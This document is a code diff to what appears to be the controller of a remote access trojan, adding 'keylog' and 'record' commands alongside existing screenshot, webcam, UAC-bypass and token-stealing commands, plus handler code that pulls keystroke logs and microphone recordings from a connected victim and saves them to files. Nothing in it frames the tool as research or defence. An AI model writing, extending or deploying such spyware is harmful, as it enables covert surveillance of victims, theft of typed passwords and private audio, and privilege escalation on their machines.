@@ -19,6 +19,8 @@ commands = {'help': ['Show this help'],
             'run': ['Create a process without waiting for termination'],
             'screenshot': ['Grab a screenshot'],
             'webcam': ['Take a snapshot from webcam'],
+            'keylog': ['Capture keystrokes'],
+            'record': ['Record an audio from microphone'],
             'idletime': ['Display how much time the user is inactive'],
             'bypassuac': ['Elevate as administrator without UAC prompt'],
             'stealtoken': ['Duplicate access token from a running process'],
@@ -157,6 +159,18 @@ class Server(object):
                 elif cmd == 'webcam':
                     send(conn, cmd)
                     recv_file(conn, 'Webcam_' + get_time() + '.png')
+                elif cmd == 'keylog_stop':
+                    send(conn, cmd)
+                    recv_file(conn, 'Keylog_' + get_time() + '.txt')
+                    break
+                elif cmd.split(' ')[0] == 'record':
+                    send(conn, cmd)
+                    status = recv(conn)
+                    print(status)
+                    if str(status).startswith('[-]'):
+                        continue
+                    recv_file(conn, 'Record_' + get_time() + '.wav')
+                    print(recv(conn))
                 elif cmd in ['idletime', 'setcritical']:
                     send(conn, cmd)
                     print(recv(conn))
